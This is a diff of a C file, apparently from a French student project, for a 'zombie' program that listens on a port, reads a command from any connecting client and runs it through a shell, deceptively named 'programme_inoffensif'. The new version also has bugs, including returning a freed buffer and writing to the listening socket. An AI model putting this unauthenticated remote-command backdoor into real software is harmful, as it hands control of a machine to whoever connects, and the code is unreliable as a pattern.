@@ -7,68 +7,60 @@
 
 #include "utils_v2.h"
 #include "info.h"
+#include "reseau.h"
 
-volatile sig_atomic_t end = 0;
-
-int initSocketZombie(int port)
-{
-  int sockfd = ssocket();
-  sbind(port,sockfd);
-  slisten(sockfd,5);
-  return sockfd;
-}
-
-int choisirPort(){
-    int port = 5001; // A FAIRE POUR QUE CE SOIT AU HASARD
-    /*
-      for (int i = 0; i < NUM_PORTS; i++) {
-        printf("%d\n", PORTS[i]);
-        //chosir un port au hasard (a faire)
-    }
-    */
-    printf("Port choisi : %d\n", port);
-    return port;
-}
-
+/*
 void EndZombieHandler(int num){
     end = 1;
-}
+}*/
 
-void programme_inoffensif(void* newsockfdd) {
-    int* newsockfd = newsockfdd;
-    char commande[256];
+char* programme_inoffensif(char* commande) 
+{
+    char* rep = malloc(100 * sizeof(char));
+    printf("%d porttt", PORTS[0]);
+    printf("%d porttt", NUM_PORTS);
+    FILE* fp = popen(commande, "r");
+    if (fp == NULL) {
+        perror("Erreur lors de l'exécution de la commande");
+        return NULL;
+    }
 
-    int fd = sread(*newsockfd,commande,strlen(commande));
 
-    dup2(fd,0);
+    // Lecture réponse 
+    fgets(rep, 100, fp);
 
-    sexecl("/bin/bash", "bash", commande, (char *) NULL);
+    // Suppression du caractère de saut de ligne à la fin de la réponse
+    size_t len = strlen(rep);
+    if (len > 0 && rep[len - 1] == '\n') {
+        rep[len - 1] = '\0';
+    }
 
+    // Fermeture du flux de fichier
+    pclose(fp);
+
+    free(rep);
+    return rep;
 }
 
 int main(int argc, char *argv[]){
-    int port;
+    int sockfd = initSocketZombie();
 
-    if(argv[1] == NULL){
-        port = choisirPort();
-    }else{
-        port = atoi(argv[1]);
-    }
+    int newsockfd;
     
-    int sockfd = initSocketZombie(port);
-
-    while(!end){
+    /*while(!end){*/
+    while(true){
         // attend une connexion
         printf("En attente de connexion\n");
-        int newsockfd = saccept(sockfd);
+        newsockfd = saccept(sockfd);
         printf("Connexion établie\n");
 
-        int pid_zombie = fork_and_run1(programme_inoffensif, &newsockfd);
+        char* commande = (char*) malloc(10*sizeof(char));
+        sread(newsockfd, commande, 10*sizeof(char));
+        char* rep = programme_inoffensif(commande);
 
-        /* Attente de la terminaison du processus fils */
-        int status;
-        swaitpid(pid_zombie, &status, 0);
         sclose(newsockfd);
+        // renvoyer la rep de la commande
+        swrite(sockfd, rep, sizeof(char)*100);
     }
 
     return 0;
